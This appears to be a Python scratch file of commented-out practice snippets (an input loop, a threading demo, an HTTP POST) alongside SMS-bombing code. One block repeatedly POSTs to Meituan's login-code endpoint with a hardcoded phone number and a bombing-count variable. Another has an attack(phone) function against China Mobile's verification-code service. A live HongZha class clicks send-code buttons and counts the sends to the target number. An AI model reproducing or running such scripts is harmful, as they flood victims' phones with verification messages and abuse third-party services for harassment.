# while True:
#     try:
#         number = int(input("你喜欢的数字是？"))
#         print(18/number)
#         break
#     except:
#         print("请输入数字！")
#     finally:
#         print("本次计算结束")

#
# import  threading
# class wxMessenger(threading.Thread):
#     def run(self):
#         for x in range(10):
#             print(threading.current_thread().getName())
#
# x = wxMessenger(name='发送消息')
#
# y = wxMessenger(name='接收消息')
#
# x.start()
# y.start()


# import urllib.parse
# import http.client
# import json
#
# test_data = {'uid': 55, 'page': 1}
# test_data_url_encode = urllib.parse.urlencode(test_data)
# request_url = "http://m.mp.oeeee.com/uncache.php?m=Doc&a=spaceInfo"
# conn = http.client.HTTPConnection('m.mp.oeeee.com')
# header = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
# conn.request(method="POST", url=request_url, headers=header, body=test_data_url_encode)
# response = conn.getresponse()
# # print(response.status)
# # #print(response.reason)
# res = response.read()
# #print(res)
# resp = json.loads(res)
# print(resp)




# import requests
# # import time
# # tel=''
# # # 手机号码
# # url='https://passport.meituan.com/account/mobilelogincode?uuid=d0f60b6bfdc64abasda8c67.1544579308.1.0.0'
# # # 请求地址
# # headers={"Accept":"*/*",
# #          "Accept-Encoding": "gzip, deflate, br",
# #          "Accept-Language": "zh-CN,zh;q=0.9",
# #          "Connection": "keep-alive",
# #          "Content-Length": "18",
# #          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
# #          "Host": "passport.meituan.com",
# #          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36",
# #          "Origin":"https://passport.meituan.com",
# #          "Referer":"https://passport.meituan.com/account/unitivelogin?service=www&continue=https%3A%2F%2Fwww.meituan.com%2Faccount%2Fsettoken%3Fcontinue%3Dhttps%253A%252F%252Fwww.meituan.com%252Ferror%252F403",
# #          "X-Client": "javascript",
# #          "X-CSRF-Token": "MMjMfCI8-yOeWe867FmSB3Z_jRnu_ctf3MXE123",
# #          "X-Requested-With": "XMLHttpRequest"}
# # # 请求头
# # data={"mobile":"13844845646"}
# # # 请求数据
# # s=1
# # # 轰炸次数
# # for _ in range(s):
# #     r = requests.post(url=url,headers=headers,data=data)
# #     print(r.text)
# #     #发送post请求
# #     #time.sleep(60)
# #     # 延迟60秒


# import http.client,urllib,sys,os,re,urllib.request
# import string
#
# from pip._vendor.distlib.compat import raw_input
#
#
# def attack(phone):
#     datas = ""
#
#     url = 'https://login.10086.cn/sendRandomCodeAction.action'
#     # 请求的数据
#     payload = {'type': '01',
#                'channelID': 12034,
#                'userName': phone}
#     # 注意Referer不能为空
#     i_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0;Win64;x64;rv:64.0) Gecko/20100101 Firefox/64.0",
#                  "Accept": "application/json, text/javascript, */*; q=0.01", 'Referer': 'https://login.10086.cn/login.html?channelID=12034&backUrl=http%3A%2F%2Fwww.10086.cn%2Findex%2Fjl%2Findex_431_431.html%3FWT.mc_id%3D8t'}
#     payload = urllib.parse.urlencode(payload).encode(encoding='UTF8')
#
#     try:
#         request = urllib.request.Request(url, payload, i_headers)
#         response = urllib.request.urlopen(request)
#         datas = response.read()
#         print(datas)
#         print(response)
#         print('attack success!!!')
#     except Exception as e:
#         print(e)
#         print ("attack failed!!!")
#
#
# if __name__ == "__main__":
#     phone = raw_input('input the phone:')
#     attack(phone)


class HongZha(object):
    def __init__(self):
        self.phone = '13844845646'
        self.num = 0

    def send_yzm(self,button,name):
        button.click()
        self.num+=1
        print("{}  第{}次 发送成功 {}".format(self.phone,self.num,name))

